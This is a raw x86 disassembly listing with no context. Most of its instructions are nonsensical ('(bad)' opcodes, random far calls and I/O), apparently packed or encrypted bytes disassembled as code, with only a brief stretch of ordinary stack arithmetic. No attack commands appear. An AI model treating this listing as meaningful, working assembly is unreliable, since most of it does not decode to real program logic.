  415dbf:	jne    0x415e13
  415dc1:	scas   eax,DWORD PTR es:[edi]
  415dc2:	xchg   edx,eax
  415dc3:	in     eax,dx
  415dc4:	push   ebp
  415dc5:	mov    dl,0xf4
  415dc7:	mov    ?,esi
  415dc9:	or     cl,BYTE PTR [edx+0x31e1b166]
  415dcf:	mov    edi,0x2135f663
  415dd4:	(bad)  
  415dd5:	mov    esp,0xcc59456a
  415dda:	mov    ebp,0x29129fd6
  415ddf:	loopne 0x415d6f
  415de1:	adc    DWORD PTR gs:[ecx+0x26ed742c],ebp
  415de8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415de9:	ins    BYTE PTR es:[edi],dx
  415dea:	call   0x975:0x813ecfe5
  415df1:	sub    eax,0x13c0010e
  415df6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415df7:	cdq    
  415df8:	ds mov ah,0x6
  415dfb:	pop    es
  415dfc:	mov    ebx,0x61f98dd7
  415e01:	das    
  415e02:	push   ss
  415e03:	jle    0x415db0
  415e05:	sub    al,0xc9
  415e07:	sti    
  415e08:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415e09:	push   esi
  415e0a:	repnz inc esi
  415e0c:	addr16 sbb eax,0xe3fac553
  415e12:	jae    0x415dec
  415e14:	outs   dx,DWORD PTR ds:[esi]
  415e15:	or     bh,ah
  415e17:	pop    ds
  415e18:	(bad)  
  415e19:	inc    ecx
  415e1a:	test   BYTE PTR [edi],bh
  415e1c:	xor    eax,0x3459bf24
  415e21:	out    0x3d,eax
  415e23:	stos   BYTE PTR es:[edi],al
  415e24:	adc    al,0xaf
  415e26:	or     ah,BYTE PTR [edi-0x7e]
  415e29:	push   esp
  415e2a:	mov    al,0xe5
  415e2c:	add    ch,BYTE PTR [esi+0x7872f0fd]
  415e32:	ficomp DWORD PTR [eax-0x15]
  415e35:	js     0x415eb6
  415e37:	(bad)  
  415e38:	std    
  415e39:	pop    ebx
  415e3a:	xor    BYTE PTR [edx-0x46172970],0xf5
  415e41:	aaa    
  415e42:	dec    esp
  415e43:	in     al,dx
  415e44:	ds rol ebx,1
  415e47:	fstp   TBYTE PTR [esi]
  415e49:	add    BYTE PTR [ecx+0x3c],0x7
  415e4d:	rcl    BYTE PTR [edi],1
  415e4f:	dec    esp
  415e50:	lods   al,BYTE PTR ds:[esi]
  415e51:	rol    BYTE PTR ds:0xaa6426d,0x56
  415e58:	sti    
  415e59:	stc    
  415e5a:	in     eax,dx
  415e5b:	into   
  415e5c:	int    0xa9
  415e5e:	(bad)  
  415e5f:	push   esp
  415e60:	call   0x1a32df94
  415e65:	enter  0x79c5,0xff
  415e69:	xor    eax,0x6e37e671
  415e6e:	(bad)  
  415e6f:	cmp    edx,esi
  415e71:	sub    ecx,edx
  415e73:	ftst   
  415e75:	mov    edi,0x8bc8fa85
  415e7a:	call   0x3b63:0x15be28a7
  415e81:	or     ebp,edi
  415e83:	std    
  415e84:	test   al,0x16
  415e86:	fst    QWORD PTR ds:0xc7dc0cde
  415e8c:	arpl   WORD PTR [esi],ax
  415e8e:	mov    bl,0x42
  415e90:	cmp    ebx,edi
  415e92:	inc    edi
  415e93:	fsub   DWORD PTR [ebx-0x5e]
  415e96:	lock mov dh,BYTE PTR [ebx+ebx*4-0x24]
  415e9b:	mov    ds:0x1fc235f9,eax
  415ea0:	repnz inc ecx
  415ea2:	jne    0x415ead
  415ea4:	cmp    BYTE PTR [eax+0x4f5a18ef],ah
  415eaa:	test   BYTE PTR [edi+0x67],bh
  415ead:	fidiv  DWORD PTR [ecx]
  415eaf:	fs stos DWORD PTR es:[edi],eax
  415eb1:	inc    ecx
  415eb2:	dec    ecx
  415eb3:	dec    ebx
  415eb4:	inc    esi
  415eb5:	pop    ebp
  415eb6:	repz dec edi
  415eb8:	fist   WORD PTR [ebp-0x35]
  415ebb:	arpl   WORD PTR gs:[esi+0x6a],bp
  415ebf:	(bad)  
  415ec0:	sbb    DWORD PTR [edx-0x72],eax
  415ec3:	and    ah,BYTE PTR [ecx+0x23326417]
  415ec9:	hlt    
  415eca:	mov    WORD PTR [ecx+0x13cd24],gs
  415ed0:	cmp    esi,DWORD PTR [esi+0x59e70b00]
  415ed6:	cs pop ebx
  415ed8:	mov    ?,WORD PTR [ebx+edi*2]
  415edb:	sar    al,1
  415edd:	jg     0x415e80
  415edf:	sub    eax,esi
  415ee1:	aas    
  415ee2:	out    dx,al
  415ee3:	push   eax
  415ee4:	lock test eax,0x1a272711
  415eea:	push   ds
  415eeb:	call   DWORD PTR [eax+edx*4+0x1012480c]
  415ef2:	mov    edi,0xe9e62402
  415ef7:	and    BYTE PTR [ebx],0xba
  415efa:	pop    es
  415efb:	int3   
  415efc:	test   eax,0x12848e3
  415f01:	cmc    
  415f02:	xor    al,0x8b
  415f04:	cmc    
  415f05:	mov    al,BYTE PTR [edi+ecx*2-0x42]
  415f09:	mov    DWORD PTR [edx],ecx
  415f0b:	xor    DWORD PTR [esi+0x6f],0x7f
  415f0f:	mov    esi,0x4d6b94be
  415f14:	test   al,0x1e
  415f16:	nop    ecx
  415f19:	aaa    
  415f1a:	sub    eax,0x1ff26ae7
  415f1f:	inc    esp
  415f20:	ror    DWORD PTR [edx+eiz*8],1
  415f23:	inc    esp
  415f24:	in     al,dx
  415f25:	sbb    ecx,DWORD PTR [ecx+0x30111a7b]
  415f2b:	jg     0x415f10
  415f2d:	jae    0x415f46
  415f2f:	and    eax,0x170eaf77
  415f34:	int3   
  415f35:	mov    BYTE PTR [eax-0x5c95dbe5],bl
  415f3b:	icebp  
  415f3c:	xchg   edi,eax
  415f3d:	fisttp QWORD PTR [eax+eiz*1+0xb]
  415f41:	adc    al,0x9e
  415f43:	call   0xb8a3:0x71e53827
  415f4a:	push   ds
  415f4b:	jno    0x415f26
  415f4d:	jmp    0x4331:0x7b8ffc75
  415f54:	pop    eax
  415f55:	sub    BYTE PTR [edx],bl
  415f57:	fstp   TBYTE PTR [esi-0x7d906c23]
  415f5d:	adc    BYTE PTR [edx-0x495fcdc8],al
  415f63:	in     al,dx
  415f64:	aad    0x54
  415f66:	and    esp,DWORD PTR [ebx+edx*2-0x61e78adf]
  415f6d:	cmp    ebp,DWORD PTR [ebx+0x59]
  415f70:	dec    eax
  415f71:	jg     0x415f49
  415f73:	mov    bh,0x7f
  415f75:	xchg   ecx,eax
  415f76:	cmp    bl,BYTE PTR [eax-0x13c2d834]
  415f7c:	cmp    DWORD PTR [edx+0x69],edi
  415f7f:	bound  edi,QWORD PTR [ecx-0x385fbc9c]
  415f85:	test   BYTE PTR [ecx],dl
  415f87:	stos   DWORD PTR es:[edi],eax
  415f88:	not    DWORD PTR [edi]
  415f8a:	xlat   BYTE PTR ds:[ebx]
  415f8b:	mov    ch,0x5c
  415f8d:	ins    DWORD PTR es:[edi],dx
  415f8e:	dec    esp
  415f8f:	pop    ecx
  415f90:	and    edx,edx
  415f92:	test   DWORD PTR [ebp+0x17fab2a1],eax
  415f98:	xor    al,0x49
  415f9a:	xor    al,0x24
  415f9c:	inc    esi
  415f9d:	mov    eax,ds:0x47645ae2
  415fa2:	dec    edi
  415fa3:	jecxz  0x415fbc
  415fa5:	jns    0x415f3f
  415fa7:	test   al,0x1d
  415fa9:	adc    ecx,DWORD PTR [ebp+0x2819ba92]
  415faf:	or     ecx,DWORD PTR [ebx]
  415fb1:	add    eax,0xa8110d4
  415fb6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415fb7:	icebp  
  415fb8:	(bad)  
  415fb9:	cld    
  415fba:	enter  0xb9f0,0xce
  415fbe:	std    
  415fbf:	and    bl,ch
  415fc1:	dec    ebp
  415fc2:	or     BYTE PTR [esi],0x1
  415fc5:	(bad)  
  415fc6:	fst    DWORD PTR [esi+0x54]
  415fc9:	dec    esi
  415fca:	ins    DWORD PTR es:[edi],dx
  415fcb:	or     BYTE PTR [edx+0x32316194],0x9f
  415fd2:	mov    al,ds:0x169675df
  415fd7:	fwait
  415fd8:	xor    DWORD PTR [eax+0x2c3ad019],0x776df067
  415fe2:	mov    ebp,0xebc81144
  415fe7:	jae    0x415f94
  415fe9:	ror    BYTE PTR [edi+0x24],1
  415fec:	nop
  415fed:	shl    DWORD PTR [ebp+0x12ebaf7f],cl
  415ff3:	imul   edi,eax,0x18955f37
  415ff9:	dec    edx
  415ffa:	pop    edi
  415ffb:	xor    BYTE PTR [ecx],ah
  415ffd:	clc    
  415ffe:	js     0x415fa0
  416000:	dec    edi
  416001:	test   al,0x8b
  416003:	mov    ecx,0x89d3334d
  416008:	push   ebp
  416009:	mov    al,0x8b
  41600b:	push   ebp
  41600c:	or     BYTE PTR [ebx-0x28fc4ba3],cl
  416012:	and    edx,ebx
  416014:	mov    DWORD PTR [ebp-0x4c],edx
  416017:	mov    edx,DWORD PTR [ebp+0x8]
  41601a:	mov    ebx,DWORD PTR [ebp-0x48]
  41601d:	lea    edx,[ebx+edx*1+0x241fc1f]
  416024:	mov    DWORD PTR [ebp-0x48],edx
  416027:	mov    edx,DWORD PTR [ebp+0x8]
  41602a:	mov    ebx,0xfa5e15e2
  41602f:	sub    ebx,edx
  416031:	add    ebx,DWORD PTR [ebp-0x44]
  416034:	mov    DWORD PTR [ebp-0x44],ebx
  416037:	mov    edx,DWORD PTR [ebp+0x8]
  41603a:	xor    edx,eax
  41603c:	add    edx,esi
  41603e:	jmp    0x418387
  416043:	inc    ebp
  416044:	mov    edx,eax
  416046:	ss xchg edx,eax
  416048:	test   ebx,0x7652fd8b
  41604e:	and    eax,0x9a218d19
  416053:	clc    
  416054:	push   ebp
  416055:	jge    0x4160d3
  416057:	inc    eax
  416058:	pop    edi
  416059:	jl     0x4160d7
  41605b:	ret    0xea49
  41605e:	stos   DWORD PTR es:[edi],eax
  41605f:	mov    ch,0xd0
  416061:	mov    ds:0xd440457,al
  416066:	mov    esi,0x24f27bf3
  41606b:	es push ecx
  41606d:	(bad)  
  41606e:	add    DWORD PTR [ecx+0x66b61025],eax
  416074:	mov    edi,0xd441829f
  416079:	out    dx,al
  41607a:	fnstcw WORD PTR [ecx-0x26]
  41607d:	das    
  41607e:	xchg   ecx,eax
  41607f:	xchg   esp,eax
  416080:	mul    DWORD PTR [ebx+edx*2]
  416083:	xchg   ebp,eax
  416084:	inc    eax
  416085:	push   cs
  416086:	jmp    0x4160b2
  416088:	hlt    
  416089:	or     bh,BYTE PTR [edi+0x18605f06]
  41608f:	sub    eax,ebp
  416091:	xlat   BYTE PTR gs:[ebx]
  416093:	inc    edx
  416094:	push   ds
  416095:	fs push 0xc
  416098:	sbb    bh,BYTE PTR [ebx]
  41609a:	sub    eax,0x2c4d3c9b
  41609f:	popa   
  4160a0:	add    BYTE PTR [esi+0x4249a24f],ch
  4160a6:	inc    ebx
  4160a7:	jns    0x41609b
  4160a9:	mov    bl,BYTE PTR [edi+0x1e]
  4160ac:	daa    
  4160ad:	and    eax,0x886081a1
  4160b2:	xor    al,BYTE PTR [ecx*8+0xf876c26]
  4160b9:	and    BYTE PTR [ebx],al
  4160bb:	addr16 call 0x8df72a70
  4160c1:	xchg   esi,eax
  4160c2:	(bad)  
  4160c3:	or     al,0x55
  4160c5:	adc    eax,0xa8b0b5ce
  4160ca:	scas   eax,DWORD PTR es:[edi]
  4160cb:	frstor [esi]
  4160cd:	mov    dl,BYTE PTR [ebx-0x797b54be]
  4160d3:	imul   esp,DWORD PTR [ebp+ebp*1+0x2f2abac7],0xffffffb3
  4160db:	mov    esi,0x4119b9a6
  4160e0:	out    0xf2,al
  4160e2:	std    
  4160e3:	jmp    0x1df8a5b6
  4160e8:	imul   eax,DWORD PTR [ecx],0x51498f96
  4160ee:	les    ebx,FWORD PTR [ecx+0x3ceb875]
  4160f4:	push   eax
  4160f5:	arpl   bp,bp
  4160f7:	jae    0x4160bf
  4160f9:	lods   eax,DWORD PTR ds:[esi]
  4160fa:	je     0x41616c
  4160fc:	call   DWORD PTR [ebx]
  4160fe:	push   esp
  4160ff:	addr16 mov es:0x699b,al
  416104:	mov    al,BYTE PTR [edi]
  416106:	adc    bh,BYTE PTR [ebx+0x11]
  416109:	sbb    al,BYTE PTR [eax+ebp*1+0xd]
  41610d:	cwde   
  41610e:	hlt    
  41610f:	pop    edx
  416110:	mov    ebp,0x5ca28fe8
  416115:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416116:	jbe    0x416192
  416118:	push   ebp
  416119:	jb     0x41611f
  41611b:	xchg   DWORD PTR [edi+0x3a774d08],edx
  416121:	pop    esi
  416122:	xchg   esp,eax
  416123:	adc    dh,bh
  416125:	(bad)  
  416127:	sub    BYTE PTR [ecx],bh
  416129:	cmp    BYTE PTR [esi-0xca461c7],bl
  41612f:	pop    es
  416130:	push   esp
  416131:	rol    DWORD PTR [edi-0x39],0xd6
  416135:	mov    dh,0x77
  416137:	mov    ?,WORD PTR [eax+0x5e3611ad]
  41613d:	push   0xa70f6b29
  416142:	arpl   ax,ax
  416144:	mov    ecx,0x317d3aca
  416149:	sbb    eax,0xc1ce6f6a
  41614e:	add    DWORD PTR [edi+esi*4+0x38],edi
  416152:	xchg   esp,eax
  416153:	or     eax,DWORD PTR [ebx]
  416155:	pop    esp
  416156:	je     0x41614e
  416158:	jnp    0x4160e7
  41615a:	pop    esp
  41615b:	fist   DWORD PTR ds:0xc048e60b
  416161:	push   ss
  416162:	call   0x46a4:0x5c436c06
  416169:	arpl   dx,dx
  41616b:	idiv   BYTE PTR [edi-0x5367e576]
  416171:	and    bl,BYTE PTR [esp+ebx*2+0x14]
  416175:	fild   DWORD PTR [edi-0x44e5e148]
  41617b:	js     0x416112
  41617d:	stos   DWORD PTR es:[edi],eax
  41617e:	inc    ebx
  41617f:	pop    edx
  416180:	xchg   ebx,eax
  416181:	test   al,0x26
  416183:	add    eax,DWORD PTR [ebx]
  416185:	fs fs stos DWORD PTR es:[edi],eax
  416188:	or     bh,ch
  41618a:	sub    BYTE PTR [edi+0x4f],cl
  41618d:	jo     0x41614b
  41618f:	mov    ah,0xee
  416191:	fdiv   st,st(7)
  416193:	loop   0x416214
  416195:	fst    DWORD PTR [edi+0x769dab76]
  41619b:	cmp    DWORD PTR [edi+0x66],ebx
  41619e:	inc    ebp
  41619f:	loope  0x416140
  4161a1:	jmp    0xdc5f28c9
  4161a6:	add    al,0x82
  4161a8:	inc    BYTE PTR [ebx]
  4161aa:	mov    edi,0x484287cc
  4161af:	ficom  WORD PTR [eax]
  4161b1:	aas    
  4161b2:	mov    ds:0xc880898f,al
  4161b7:	int3   
  4161b8:	dec    esi
  4161b9:	pusha  
  4161ba:	sar    DWORD PTR [edx-0x7c1df582],0xec
  4161c1:	jl     0x4161b6
  4161c3:	imul   ebx,DWORD PTR [ebx-0x6ce637ca],0xffffffab
  4161ca:	mov    bl,0xff
  4161cc:	mov    edx,0x14e33a27
  4161d1:	fcomp  DWORD PTR [edi+0x57]
  4161d4:	(bad)  
  4161d5:	retf   
  4161d6:	lods   al,BYTE PTR ds:[esi]
  4161d7:	dec    edx
  4161d8:	daa    
  4161d9:	or     al,0xbc
  4161db:	push   edi
  4161dc:	ins    DWORD PTR es:[edi],dx
  4161dd:	dec    esi
  4161de:	pop    ecx
  4161df:	ins    BYTE PTR es:[edi],dx
  4161e0:	add    eax,0x286a4fc4
  4161e5:	int3   
  4161e6:	jmp    0x416219
  4161e8:	xor    al,0x8f
  4161ea:	dec    esp
  4161eb:	mov    dh,0x23
  4161ed:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  4161ef:	jo     0x4161ec
  4161f1:	xlat   BYTE PTR ds:[ebx]
  4161f2:	jge    0x4161f6
  4161f4:	pop    esp
  4161f5:	sub    DWORD PTR [ebx],edi
  4161f7:	pop    esp
  4161f8:	and    cl,0x87
  4161fb:	(bad)  
  4161fc:	mov    ecx,0x7f04dca4
  416201:	push   0x59
  416203:	pop    esi
  416204:	adc    ebx,ebp
  416206:	inc    edx
  416207:	nop
  416208:	aad    0xd9
  41620a:	mov    BYTE PTR [ebx-0x2e],ch
  41620d:	gs mov ecx,0xf6cb8397
  416213:	mov    eax,ds:0x6f266daa
  416218:	loope  0x41625f
  41621a:	test   eax,0x33cfb82d
  41621f:	mov    eax,0xb51901a5
  416224:	inc    ebx
  416225:	std    
  416226:	xchg   ecx,eax
  416227:	mov    edx,0x1693a56c
  41622c:	mov    bl,0x20
  41622e:	sub    al,0xc2
  416230:	lahf   
  416231:	mov    dl,0xfc
  416233:	ins    DWORD PTR es:[edi],dx
  416234:	repnz addr16 xchg edx,eax
  416237:	shr    DWORD PTR [ebx+0x54],1
  41623a:	sbb    dh,BYTE PTR [ebx-0x78]
  41623d:	push   ebx
  41623e:	push   ebp
  41623f:	fmul   DWORD PTR [edx]
  416241:	(bad)  
  416242:	xchg   esp,eax
  416243:	outs   dx,DWORD PTR ds:[esi]
  416244:	iret   
  416245:	jmp    0x81f6:0x7a000203
  41624c:	out    0x57,al
  41624e:	sub    al,0x41
  416250:	xchg   esi,eax
  416251:	cwde   
  416252:	dec    eax
  416253:	xor    si,ax
  416256:	xor    DWORD PTR [edx+0x21],ebx
  416259:	(bad)  
  41625b:	xchg   edi,eax
  41625c:	cmc    
  41625d:	neg    edx
  41625f:	ror    edi,1
  416261:	adc    bh,BYTE PTR [ebx+eax*8-0x8]
  416265:	shl    BYTE PTR [edi],1
  416267:	lods   al,BYTE PTR ds:[esi]
  416268:	cld    
  416269:	add    edx,DWORD PTR ss:[ebx+0x78]
  41626d:	(bad)  [edx+0x5b]
  416270:	inc    edi
  416271:	add    cl,BYTE PTR [ebp+0x53]
  416274:	push   esi
  416275:	sub    al,0x90
  416277:	lods   eax,DWORD PTR ds:[esi]
  416278:	loop   0x416224
  41627a:	xchg   edi,eax
  41627b:	popf   
  41627c:	jg     0x41623e
  41627e:	dec    edx
  41627f:	loopne 0x416213
  416281:	ret    0xb38
  416284:	pop    edi
  416285:	sbb    DWORD PTR [ebp+0x29],0xffffffa2
  416289:	sbb    DWORD PTR [edi+edx*4],ecx
  41628c:	popa   
  41628d:	pop    esi
  41628e:	int    0x1a
  416290:	stos   BYTE PTR es:[edi],al
  416291:	inc    edi
  416292:	jnp    0x4162d1
  416294:	das    
  416295:	or     eax,DWORD PTR [ebp+0x31bd3019]
  41629b:	out    dx,al
  41629c:	hlt    
  41629d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41629e:	(bad)  
  4162a0:	sub    DWORD PTR [esi+0xb0c0a10],0x889d4afc
  4162aa:	pop    edi
  4162ab:	add    DWORD PTR [ebp-0x7931e475],0xffffff99
  4162b2:	sbb    BYTE PTR [ecx],dh
  4162b4:	mov    ch,0xe3
  4162b6:	sti    
  4162b7:	aad    0x7a
  4162b9:	arpl   sp,sp
  4162bb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4162bc:	dec    ecx
  4162bd:	add    esi,edx
  4162bf:	push   0xffffffc3
  4162c1:	push   0x16
  4162c3:	lea    ebp,[ebx]
  4162c5:	lea    edi,[edx+0x3737e56e]
  4162cb:	inc    ebp
  4162cc:	mov    edi,0x25580789
  4162d1:	sbb    ah,BYTE PTR [edi-0x6d964bd2]
  4162d7:	loopne 0x4162c1
  4162d9:	mov    edx,0x4458d3d4
  4162de:	rcl    DWORD PTR [ecx],cl
  4162e0:	and    ecx,DWORD PTR [ebx-0x68]
  4162e3:	pop    esp
  4162e4:	stos   BYTE PTR es:[edi],al
  4162e5:	mov    cl,0x83
  4162e7:	mov    eax,0x1a0946f9
  4162ec:	iret   
  4162ed:	call   0xdb3cc959
  4162f2:	dec    esi
  4162f3:	or     BYTE PTR [ebp+edi*4+0x1ab1a2c7],ah
  4162fa:	xor    DWORD PTR [edx-0x37],eax
  4162fd:	inc    eax
  4162fe:	push   edx
  4162ff:	mov    ch,0x30
  416301:	mov    DWORD PTR [eax],eax
  416303:	icebp  
  416304:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416305:	adc    BYTE PTR fs:[ebx+0x31],al
  416309:	mov    dl,0x1e
  41630b:	fiadd  WORD PTR [edi+ebp*2]
  41630e:	aas    
  41630f:	jecxz  0x416312
  416311:	dec    ebp
  416312:	sahf   
  416313:	inc    ecx
  416314:	inc    ebp
  416315:	push   esp
  416316:	pop    ss
  416317:	mov    WORD PTR [esi-0x2a22a0fa],?
  41631d:	ss sahf 
  41631f:	ss jno 0x416339
  416322:	pop    edx
  416323:	fistp  QWORD PTR [edi]
  416325:	mov    ecx,0xff62d1a6
  41632a:	jne    0x416369
  41632c:	and    ecx,edi
  41632e:	ret    
  41632f:	mov    ds:0x9080773e,al
  416334:	push   eax
  416335:	or     eax,0xe41b9f07
  41633a:	jecxz  0x4162d3
  41633c:	pop    ebp
  41633d:	or     al,0x8b
  41633f:	stc    
  416340:	or     eax,0x3e5318ac
  416345:	xchg   edx,eax
  416346:	push   ebp
  416347:	cmp    BYTE PTR [edx+eiz*1+0x45f6496d],0x2b
  41634f:	or     BYTE PTR [esi-0x19ec957a],bh
  416355:	cs retf 0xf634
  416359:	mov    ebp,0xce68763f
  41635e:	ins    DWORD PTR es:[edi],dx
  41635f:	jg     0x41631f
  416361:	imul   edi,DWORD PTR [eax+0x10],0x1238f72d
  416368:	dec    ebp
  416369:	das    
  41636a:	lods   eax,DWORD PTR ds:[esi]
  41636b:	aad    0x5b
  41636d:	test   eax,0x74a166c
  416372:	mov    WORD PTR [edi+0x7f47d36c],cs
  416378:	lahf   
  416379:	out    0x8d,al
  41637b:	pop    eax
  41637c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41637d:	inc    edx
  41637e:	cld    
  41637f:	mov    eax,ds:0xf7035277
  416384:	outs   dx,BYTE PTR ds:[esi]
  416385:	lods   eax,DWORD PTR ds:[esi]
  416386:	sti    
  416387:	pop    edx
  416388:	fmulp  st(7),st
  41638a:	shl    BYTE PTR [edi-0x51886be8],0xd3
  416391:	mov    ah,0xe8
  416393:	or     esi,edi
  416395:	or     DWORD PTR [edi-0x484bb587],ebp
  41639b:	adc    edx,edx
  41639d:	leave  
  41639e:	pop    ecx
  41639f:	repz dec ebp
  4163a1:	aas    
  4163a2:	sbb    eax,0x7c407f54
  4163a7:	cmp    eax,0x7c2d6fa8
  4163ac:	and    ch,BYTE PTR [edx]
  4163ae:	jne    0x4163fb
  4163b0:	mov    eax,ds:0x6a7166b1
  4163b5:	sbb    eax,0x6fde6748
  4163ba:	out    0xfd,eax
  4163bc:	cld    
  4163bd:	fldcw  WORD PTR [esi-0x5cc643de]
  4163c3:	shl    DWORD PTR [ecx+0x3d],1
  4163c6:	jns    0x4163af
  4163c8:	adc    dl,BYTE PTR [edi-0x2]
  4163cb:	pop    DWORD PTR [ebp+0x38]
  4163ce:	or     BYTE PTR [ebx],dh
  4163d0:	inc    ebx
  4163d1:	addr16 in al,dx
  4163d3:	push   ebp
  4163d4:	jne    0x416447
  4163d6:	or     eax,0x6061e79b
  4163db:	bound  eax,QWORD PTR [ecx+0x7]
  4163de:	sub    DWORD PTR [ebx],ecx
  4163e0:	not    DWORD PTR [ebx+0x3b5b874e]
  4163e6:	push   ebp
  4163e7:	sub    ecx,DWORD PTR [esi]
  4163e9:	scas   eax,DWORD PTR es:[edi]
  4163ea:	and    BYTE PTR [ebx+edi*1-0x51],dl
  4163ee:	pop    esp
  4163ef:	outs   dx,DWORD PTR ds:[esi]
  4163f0:	push   0x7b
  4163f2:	pop    edx
  4163f3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4163f4:	in     eax,dx
  4163f5:	push   eax
  4163f6:	sti    
  4163f7:	xchg   DWORD PTR [ecx+0x519e422a],edi
  4163fd:	jno    0x4163b4
  4163ff:	xchg   esp,eax
  416400:	mov    DWORD PTR [esi],esi
  416402:	cmp    eax,0x11ff7989
  416407:	imul   eax,DWORD PTR [esi-0x2a],0x17
  41640b:	int3   
  41640c:	pop    ds
  41640d:	imul   eax,DWORD PTR ds:0xec7dfde3,0xb57d9636
  416417:	mov    DWORD PTR [ecx],edi
  416419:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41641a:	mov    dl,0x2e
  41641c:	out    dx,al
  41641d:	sub    BYTE PTR [ecx+0x2c41b8b8],ah
  416423:	and    eax,0xb6f1f553
  416428:	add    DWORD PTR [eax-0x4ceed031],ebp
  41642e:	xor    BYTE PTR [ecx+0x225257ab],dh
  416434:	fldcw  WORD PTR [ecx+eax*8]
  416437:	cmp    edx,eax
  416439:	jecxz  0x416433
  41643b:	xchg   ecx,eax
  41643c:	sub    dh,BYTE PTR [ebx+0x14]
  41643f:	mov    ebp,0x80848264
  416444:	or     ebp,DWORD PTR [edx+0x474c5ec5]
  41644a:	jle    0x41648d
  41644c:	inc    esi
  41644d:	stc    
  41644e:	dec    esp
  41644f:	sub    BYTE PTR [edx+0x22],ch
  416452:	dec    esp
  416453:	repnz cmp BYTE PTR [ebp+0x70],ah
  416457:	push   ebx
  416458:	sahf   
  416459:	xchg   BYTE PTR [esi+eiz*1],dl
  41645c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41645d:	fwait
  41645e:	outs   dx,BYTE PTR ds:[esi]
  41645f:	gs hlt 
  416461:	scas   al,BYTE PTR es:[edi]
  416462:	loop   0x4163ee
  416464:	jnp    0x416437
  416466:	sbb    dl,BYTE PTR [ebx-0x2928ca70]
  41646c:	loope  0x416466
  41646e:	add    esp,ecx
  416470:	inc    ecx
  416471:	xor    DWORD PTR [edx],esi
  416473:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416474:	xlat   BYTE PTR ds:[ebx]
  416475:	aam    0xf5
  416477:	jecxz  0x4164d6
  416479:	sub    DWORD PTR [ebx+0x34],esp
  41647c:	jp     0x4164ee
  41647e:	js     0x416412
  416480:	sub    eax,0x8e591a83
  416485:	add    al,0x8f
  416487:	mov    ebp,0xe6173504
  41648c:	adc    al,0x61
  41648e:	and    al,0x6b
  416490:	mov    esi,0x8fb39b67
  416495:	cmc    
  416496:	dec    eax
  416497:	adc    DWORD PTR [edi],eax
  416499:	das    
  41649a:	dec    edi
  41649b:	aad    0xa9
  41649d:	push   eax
  41649e:	bound  ecx,QWORD PTR [esi]
  4164a0:	in     al,dx
  4164a1:	fld    st(1)
  4164a3:	and    al,0xe6
  4164a5:	cmp    esi,ebx
  4164a7:	not    dl
  4164a9:	in     eax,dx
  4164aa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4164ab:	loope  0x416500
  4164ad:	mov    ebx,DWORD PTR fs:[edi-0x70ef0369]
  4164b4:	xchg   edx,eax
  4164b5:	adc    bh,BYTE PTR [esp+ebp*2+0x31]
  4164b9:	ret    0xd59b
  4164bc:	or     DWORD PTR [ecx+0x358c4d6],esi
  4164c2:	mov    dh,0xf6
  4164c4:	push   eax
  4164c5:	xor    BYTE PTR [ebx],0x53
  4164c8:	jg     0x41646b
  4164ca:	sub    edx,DWORD PTR [ebp+0x32]
  4164cd:	xchg   edi,eax
  4164ce:	popa   
  4164cf:	lods   al,BYTE PTR ds:[esi]
  4164d0:	stos   DWORD PTR es:[edi],eax
  4164d1:	stc    
  4164d2:	out    0x8c,eax
  4164d4:	adc    BYTE PTR [edx],bh
  4164d6:	pop    edx
  4164d7:	loopne 0x41653f
  4164d9:	add    edi,DWORD PTR [eax+eax*1-0x29d2828e]
  4164e0:	fidivr DWORD PTR [edi+ecx*8]
  4164e3:	push   edx
  4164e4:	shl    BYTE PTR [esi+0x1dcec5b5],0xf7
  4164eb:	mov    ds:0xb7368459,al
  4164f0:	ins    BYTE PTR es:[edi],dx
  4164f1:	test   BYTE PTR [edx-0x1],ch
  4164f4:	xor    al,al
  4164f6:	lds    ebx,FWORD PTR [esi+0x53ff0f70]
  4164fc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4164fd:	mov    ah,0xbd
  4164ff:	mov    BYTE PTR [ebx+0x71],ch
  416502:	fsub   QWORD PTR [ebx+0x63bca51c]
  416508:	sbb    BYTE PTR [edi],dl
  41650a:	lea    edx,[esi+0x2e68fc64]
  416510:	mov    ds:0xace3b0e0,al
  416515:	ds (bad) 
  416517:	shr    BYTE PTR [ecx],1
  416519:	or     DWORD PTR [ecx-0x1e],0x3b99bb69
  416520:	cwde   
  416521:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416522:	packuswb mm1,QWORD PTR [edi+0x56b7d5f1]
  416529:	xor    dh,dl
  41652b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41652c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41652d:	hlt    
  41652e:	jns    0x416567
  416530:	nop
  416531:	mov    bl,0x3
  416533:	xchg   ecx,eax
  416534:	jecxz  0x416580
  416536:	adc    al,bh
  416538:	add    al,0x5c
  41653a:	pop    ecx
  41653b:	fldenv [eax]
  41653d:	jne    0x4164cc
  41653f:	push   ecx
  416540:	push   cs
  416541:	cmp    eax,0xcb43be8f
  416546:	in     al,dx
  416547:	mov    bl,0xa6
  416549:	add    eax,0x90a0ba78
  41654e:	arpl   WORD PTR [ecx],bx
  416550:	lea    eax,[eax+0x5e]
  416553:	mov    eax,0x9dbc17ee
  416558:	ss int3 
  41655a:	adc    esi,DWORD PTR [esi-0x75f2d069]
  416560:	jns    0x41651a
  416562:	xor    BYTE PTR [ebp-0x69],dl
  416565:	(bad)  
  416566:	sbb    dl,BYTE PTR [eax+0x47]
  416569:	jnp    0x416539
  41656b:	mov    bl,0x7a
  41656d:	add    edx,ebx
  41656f:	jbe    0x41656b
  416571:	fs (bad) 
  416573:	ret    0x9c48
  416576:	fst    st(7)
